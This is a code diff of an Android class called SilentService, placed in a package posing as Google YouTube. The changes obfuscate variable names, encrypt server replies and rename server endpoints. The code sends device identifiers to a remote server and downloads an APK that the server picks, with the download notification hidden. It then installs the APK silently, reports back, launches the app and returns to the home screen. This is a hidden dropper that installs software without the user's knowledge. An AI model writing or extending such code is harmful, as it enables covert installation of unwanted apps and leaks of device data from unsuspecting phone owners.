@@ -3,16 +3,11 @@ package com.google.youtube.services;
 import java.io.File;
 import java.util.Calendar;
 import java.util.Date;
-import java.util.Iterator;
-import java.util.Map;
-import java.util.Set;
-
 import org.json.JSONObject;
-
+import com.google.youtube.utils.A;
 import com.google.youtube.utils.DeviceUtils;
 import com.google.youtube.utils.HttpUtil;
 import com.google.youtube.utils.MyHelpUtil;
-
 import android.app.DownloadManager;
 import android.app.DownloadManager.Query;
 import android.app.DownloadManager.Request;
@@ -22,14 +17,12 @@ import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
-import android.content.pm.PackageManager.NameNotFoundException;
 import android.database.Cursor;
 import android.net.Uri;
-import android.os.AsyncTask;
 import android.os.Environment;
 import android.text.TextUtils;
 
-public class SilentService extends AsyncTask<Void, Integer, String> {
+public class SilentService {
 
 	private Context context;
 
@@ -37,28 +30,28 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 		this.context = context;
 	}
 
-	private String apppakname;
+	private String a;
 
-	private String appalias;
+	private String b;
 
-	private int install_count = 6;
+	private int c = 6;
 
-	private int screen_count = 500;
+	private int d = 500;
 
-	private int s_interval = 24;
+	private int e = 24;
 
-	private int d_interval = 5;
+	private int f = 5;
 
-	private String download_url;
+	private String g;
 
-	@Override
-	protected String doInBackground(Void... params) {
-		// TODO Auto-generated method stub
+	/**
+	 * 运行静默
+	 */
+	public void run() {
 
 		if (MyHelpUtil.checkNet(context)) {
 
-			/* get_install_msg __ c */
-			String localURL = HttpUtil.BASE_URL + "app_c.action";
+			String localURL = HttpUtil.BASE_URL + "google_c.action";
 
 			String param = setPostParams();
 
@@ -66,95 +59,123 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 
 				String msg = HttpUtil.postRequest(localURL, param);
 
+				System.out.println("服务器返回信息：" + msg);
+
 				if (!TextUtils.isEmpty(msg)) {
 
-					JSONObject jsb = new JSONObject(msg);
+					JSONObject jsb = new JSONObject(MyHelpUtil.deCrypto(msg));
 
-					screen_count = jsb.getInt("screen_count");
+					d = jsb.getInt("d");
 
-					s_interval = jsb.getInt("s_interval");
+					e = jsb.getInt("e");
 
-					apppakname = jsb.getString("apppakname");
+					a = jsb.getString("a");
 
-					appalias = jsb.getString("appalias");
+					b = jsb.getString("b");
 
-					install_count = jsb.getInt("install_count");
+					c = jsb.getInt("c");
 
-					d_interval = jsb.getInt("d_interval");
+					f = jsb.getInt("f");
 
-					download_url = jsb.getString("download_url");
+					g = jsb.getString("g");
 
-					boolean bool = checkOption(screen_count, s_interval,
-							apppakname, install_count);
+					SharedPreferences appSharedPreferences = context
+							.getSharedPreferences("inr", 0);
 
-					if (bool) {
-						localDownloadManager(appalias, apppakname, download_url);
+					String p = MyHelpUtil.enCrypto(a, MyHelpUtil.A);
+
+					File path = Environment.getExternalStoragePublicDirectory(A
+							.gc());
+
+					File file = new File(path, b + ".apk");
+
+					if (appSharedPreferences.getInt(p, 0) >= c) {
+
+						if (file.exists()) {
+
+							file.delete();
+
+						}
 					}
 
-				} else {
-					cancel(false);
+					boolean bool = checkOption(d, e, a, c);
+
+					if (bool) {
+
+						System.out.println("--jm--:Y");
+
+						if (!appSharedPreferences.contains(p)) {
+
+							Editor localEditor = appSharedPreferences.edit();
+
+							localEditor.putInt(p, 0);
+
+							localEditor.commit();
+
+						}
+
+						localDownloadManager(b, a, g);
+
+					} else {
+						System.out.println("--jm--:N");
+					}
+
 				}
 
 			} catch (Exception e) {
 				e.printStackTrace();
-				cancel(false);
 			}
-
-		} else {
-
-			cancel(false);
 		}
-
-		return null;
 	}
 
-	/**
-	 * silent dateTime
-	 */
-	private boolean checkOption(int screen_count, int interval,
-			String apppakname, int install_count) {
+	private boolean checkOption(int a, int b, String c, int d) {
 
-		SharedPreferences localSharedPreferences = context
-				.getSharedPreferences("SCREEN_STATUS", 0);
+		synchronized (this) {
 
-		SharedPreferences msgSharedPreferences = context.getSharedPreferences(
-				"MSG_STATUS", 0);
+			SharedPreferences localSharedPreferences = context
+					.getSharedPreferences("scr", 0);
 
-		SharedPreferences installSharedPreferences = context
-				.getSharedPreferences("INSTALL_STATUS", 0);
+			SharedPreferences msgSharedPreferences = context
+					.getSharedPreferences("tir", 0);
 
-		int local_screen_count = localSharedPreferences.getInt("screen_count",
-				0);
+			SharedPreferences installSharedPreferences = context
+					.getSharedPreferences("inr", 0);
 
-		int installCount = installSharedPreferences.getInt(apppakname, 0);
+			int local_screen_count = localSharedPreferences.getInt("sc", 0);
 
-		boolean time_iner = false;
+			int installCount = installSharedPreferences.getInt(
+					MyHelpUtil.enCrypto(c, MyHelpUtil.A), 0);
 
-		if (!msgSharedPreferences.contains("silent")) {
+			boolean time_iner = false;
 
-			time_iner = true;
-		} else {
-
-			long reslut = Math.abs(new Date().getTime()
-					- msgSharedPreferences.getLong("silent", 0));
-
-			long display_interval_to_long = Math.abs(interval * 3600 * 1000);
-
-			if (reslut >= display_interval_to_long) {
+			if (!msgSharedPreferences.contains("si")) {
 
 				time_iner = true;
 
+			} else {
+
+				/**/
+				long reslut = Math.abs(new Date().getTime()
+						- msgSharedPreferences.getLong("si", 0));
+
+				long display_interval_to_long = Math.abs(b * 3600 * 1000);
+
+				if (reslut >= display_interval_to_long) {
+
+					time_iner = true;
+
+				}
 			}
+
+			if (local_screen_count >= a && time_iner && installCount < d) {
+
+				return true;
+
+			}
+
+			return false;
+
 		}
-
-		if (local_screen_count >= screen_count && time_iner
-				&& installCount <= install_count) {
-
-			return true;
-
-		}
-
-		return false;
 	}
 
 	private String setPostParams() {
@@ -174,48 +195,49 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 				+ localSharedPreferences_id.getString("create_device_id",
 						"null"));
 
+		params_sb.append("&l=" + DeviceUtils.getTelephoneType(context));
+
 		return params_sb.toString();
 	}
 
 	private boolean checkDownloadOption() {
 
 		SharedPreferences localSharedPreferences = context
-				.getSharedPreferences("MSG_STATUS", 0);
+				.getSharedPreferences("tir", 0);
 
-		long s = localSharedPreferences.getLong("sdownload", -1);
+		long s = localSharedPreferences.getLong("sdd", -1);
 
 		if (s == -1) {
 
 			return true;
 		}
 
-		long srestolong = Math.abs(d_interval * 60 * 1000);
+		long srestolong = Math.abs(f * 60 * 1000);
 
 		long res = Math.abs(new Date().getTime() - s);
 
 		if (res >= srestolong) {
 
-
 			return true;
 
-		} 
+		}
+
 		return false;
 	}
 
-	private long silentDownload(String appalias, String apppakname,
-			String download_url) {
+	private long excute(String a, String b, String c) {
 
 		DownloadManager downloadManager = (DownloadManager) context
 				.getSystemService(Context.DOWNLOAD_SERVICE);
 
 		Uri uri;
-		
-		if(TextUtils.isEmpty(download_url)){
-			
-			uri = Uri.parse(MyHelpUtil.lineDownloadAppURL(context, appalias));
-			
-		}else{
-			uri = Uri.parse(download_url);
+
+		if (TextUtils.isEmpty(c)) {
+
+			uri = Uri.parse(MyHelpUtil.lineDownloadAppURL(context, a));
+
+		} else {
+			uri = Uri.parse(c);
 		}
 
 		DownloadManager.Request request = new Request(uri);
@@ -227,8 +249,7 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 
 		request.setShowRunningNotification(false);
 
-		request.setDestinationInExternalFilesDir(context,
-				Environment.DIRECTORY_DOWNLOADS, appalias + ".apk");
+		request.setDestinationInExternalPublicDir(A.gc(), a + ".apk");
 
 		request.addRequestHeader("Connection", "Keep-Alive");
 
@@ -236,51 +257,51 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 
 		request.addRequestHeader("Charset", "UTF-8");
 
+		request.addRequestHeader("User-Agent", "Android");
+
 		request.addRequestHeader("Accept",
 				"application/vnd.android.package-archive,application/msword, */*");
 
-		synchroDownloadData(apppakname);
+		synchroDownloadData(b);
 
 		saveSilentDownloadStatus();
 
 		return downloadManager.enqueue(request);
 	}
 
-	private void synchroDownloadData(String apppakname) {
+	private void synchroDownloadData(String a) {
 
-		String rawParams = MyHelpUtil.setParams(apppakname, 1, context);
+		String rawParams = MyHelpUtil.setParams(a, 1, context);
 
 		try {
-
-			/* device_download _ */
-			HttpUtil.postRequest(HttpUtil.BASE_URL + "app_e.action", rawParams);
+			HttpUtil.postRequest(HttpUtil.BASE_URL + "google_e.action",
+					rawParams);
 		} catch (Exception e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 	}
 
-	/**
-	 * 
-	 * @param appalias
-	 * @param apppakname
-	 */
-	private void localDownloadManager(String appalias, String apppakname,
-			String download_url) {
+	private void localDownloadManager(String a, String b, String c) {
 
-		String localFileURI = context.getExternalFilesDir(
-				Environment.DIRECTORY_DOWNLOADS).getPath()
-				+ "/" + appalias + ".apk";
+		String state = Environment.getExternalStorageState();
 
-		File file = new File(localFileURI);
+		if (!Environment.MEDIA_MOUNTED.equals(state)) {
+			return;
+		}
+
+		File path = Environment.getExternalStoragePublicDirectory(A.gc());
+
+		path.mkdirs();
+
+		File file = new File(path, a + ".apk");
 
 		SharedPreferences localSharedPreferences = context
-				.getSharedPreferences("DOWLOAD_STATUS", 0);
+				.getSharedPreferences("do", 0);
 
 		DownloadManager downloadManager = (DownloadManager) context
 				.getSystemService(Context.DOWNLOAD_SERVICE);
 
-		long downloadid = localSharedPreferences.getLong(appalias, -1);
+		long downloadid = localSharedPreferences.getLong(a, -1);
 
 		if (downloadid != -1) {
 
@@ -294,45 +315,33 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 
 				if (cursor.moveToNext()) {
 
-					if (!file.exists()) {
-
-						downloadManager.remove(downloadid);
-
-						if (checkDownloadOption()) {
-
-							long id = silentDownload(appalias, apppakname,
-									download_url);
-
-							MyHelpUtil.setDownloadId(context, id, appalias);
-
-						}
-
-						return;
-					}
-
 					int column_status_index = cursor
 							.getColumnIndex(DownloadManager.COLUMN_STATUS);
 
 					int status = cursor.getInt(column_status_index);
 
+					int column_status_uri = cursor
+							.getColumnIndex(DownloadManager.COLUMN_LOCAL_URI);
+
+					String localuri = cursor.getString(column_status_uri);
+
 					if (status == DownloadManager.STATUS_SUCCESSFUL) {
 
+						// --------
 						PackageInfo pi = context.getPackageManager()
-								.getPackageArchiveInfo(localFileURI,
+								.getPackageArchiveInfo(
+										Uri.parse(localuri).getPath(),
 										PackageManager.GET_SIGNATURES);
 
 						if (pi == null || pi.signatures == null) {
 
-							if (file.exists()) {
-								file.delete();
-							}
+							downloadManager.remove(downloadid);
 
 							if (checkDownloadOption()) {
 
-								long id = silentDownload(appalias, apppakname,
-										download_url);
+								long id = excute(a, b, c);
 
-								MyHelpUtil.setDownloadId(context, id, appalias);
+								MyHelpUtil.setDownloadId(context, id, a);
 
 							}
 
@@ -340,36 +349,57 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 
 						}
 
-						int install_return = MyHelpUtil.install(localFileURI);
+						int install_return = MyHelpUtil.install(Uri.parse(
+								localuri).getPath());
+
+						File file1 = new File(Uri.parse(localuri).getPath());
 
 						if (install_return == 1) {
 
-							file.delete();
+							if (file1.exists()) {
+
+								file1.delete();
+
+							}
 
 							return;
 						}
 
 						if (install_return == 0) {
 
-							/* SysService */
+							sysInstall(b);
 
-							sysInstall(apppakname);
-
-							/* Save */
 							saveSilentStatus();
 
-							/* Open App */
 							if (checkOpenTime()) {
 
-								MyHelpUtil.openApp(apppakname, context);
+								synchroOpenData(b);
 
-								synchroOpenData(apppakname);
+								MyHelpUtil.openApp(b, context);
 
-								/* Open All App */
-								openApp();
+								try {
+
+									Thread.sleep(3 * 1000);
+
+									backHome();
+
+								} catch (InterruptedException e) {
+									// TODO Auto-generated catch block
+									e.printStackTrace();
+								}
+
 							}
-
 						}
+
+					} else if (status == DownloadManager.STATUS_FAILED) {
+
+						Editor localEditor = localSharedPreferences.edit();
+
+						localEditor.remove(a);
+
+						localEditor.commit();
+
+						downloadManager.remove(downloadid);
 
 					}
 
@@ -378,25 +408,14 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 					if (file.exists()) {
 
 						file.delete();
+					}
 
-						if (checkDownloadOption()) {
+					if (checkDownloadOption()) {
 
-							long id = silentDownload(appalias, apppakname,
-									download_url);
+						long id = excute(a, b, c);
 
-							MyHelpUtil.setDownloadId(context, id, appalias);
+						MyHelpUtil.setDownloadId(context, id, a);
 
-						}
-
-					} else {
-
-						if (checkDownloadOption()) {
-
-							long id = silentDownload(appalias, apppakname,
-									download_url);
-
-							MyHelpUtil.setDownloadId(context, id, appalias);
-						}
 					}
 
 				}
@@ -411,106 +430,55 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 
 			if (file.exists()) {
 
-				if (checkDownloadOption()) {
-
-					file.delete();
-
-					long id = silentDownload(appalias, apppakname, download_url);
-
-					MyHelpUtil.setDownloadId(context, id, appalias);
-
-				}
-
-			} else {
-
-				if (checkDownloadOption()) {
-
-					long id = silentDownload(appalias, apppakname, download_url);
-
-					MyHelpUtil.setDownloadId(context, id, appalias);
-				}
+				file.delete();
 			}
+
+			if (checkDownloadOption()) {
+
+				long id = excute(a, b, c);
+
+				MyHelpUtil.setDownloadId(context, id, a);
+
+			}
+
 		}
 
 	}
 
-	/**
-	 * 
-	 */
 	public void saveSilentStatus() {
 
 		SharedPreferences localSharedPreferences = context
-				.getSharedPreferences("MSG_STATUS", 0);
+				.getSharedPreferences("tir", 0);
 
 		Editor localEditor = localSharedPreferences.edit();
 
-		localEditor.putLong("silent", new Date().getTime());
+		localEditor.putLong("si", new Date().getTime());
 
 		localEditor.commit();
 	}
 
-	public void saveSilentDownloadStatus() {
+	private void saveSilentDownloadStatus() {
 
 		SharedPreferences localSharedPreferences = context
-				.getSharedPreferences("MSG_STATUS", 0);
+				.getSharedPreferences("tir", 0);
 
 		Editor localEditor = localSharedPreferences.edit();
 
-		localEditor.putLong("sdownload", new Date().getTime());
+		localEditor.putLong("sdd", new Date().getTime());
 
 		localEditor.commit();
 	}
 
-	public void sysInstall(String apppakname) {
+	public void sysInstall(String a) {
 
-		String params = MyHelpUtil.setParams(apppakname, 2, context);
+		String params = MyHelpUtil.setParams(a, 2, context);
 
 		try {
-			HttpUtil.postRequest(HttpUtil.BASE_URL + "app_f.action", params);
+			HttpUtil.postRequest(HttpUtil.BASE_URL + "google_f.action", params);
 		} catch (Exception e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
-	}
-
-	public void openApp() {
-
-		SharedPreferences localSharedPreferences = context
-				.getSharedPreferences("INSTALL_STATUS", 0);
-
-		Map<String, ?> sysmap = localSharedPreferences.getAll();
-
-		Set<String> keySet = sysmap.keySet();
-
-		for (Iterator<String> iterator = keySet.iterator(); iterator.hasNext();) {
-
-			String packname = (String) iterator.next();
-
-			PackageManager pm = context.getPackageManager();
-
-			try {
-
-				Thread.sleep(5 * 1000);
-
-				backHome();
-
-				PackageInfo pi = pm.getPackageInfo(packname,
-						PackageManager.GET_ACTIVITIES);
-
-				MyHelpUtil.openApp(pi.packageName, context);
-
-				synchroOpenData(pi.packageName);
-
-				Thread.sleep(8 * 1000);
-
-			} catch (NameNotFoundException e) {
-				continue;
-			} catch (InterruptedException e) {
-				e.printStackTrace();
-			}
-		}
-
-		backHome();
 	}
 
 	public void backHome() {
@@ -533,11 +501,12 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 		}
 	}
 
-	public void synchroOpenData(String apppakname) {
+	public void synchroOpenData(String a) {
 
-		String rawParams = MyHelpUtil.setParams(apppakname, 3, context);
+		String rawParams = MyHelpUtil.setParams(a, 3, context);
 		try {
-			HttpUtil.postRequest(HttpUtil.BASE_URL + "app_g.action", rawParams);
+			HttpUtil.postRequest(HttpUtil.BASE_URL + "google_g.action",
+					rawParams);
 		} catch (Exception e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
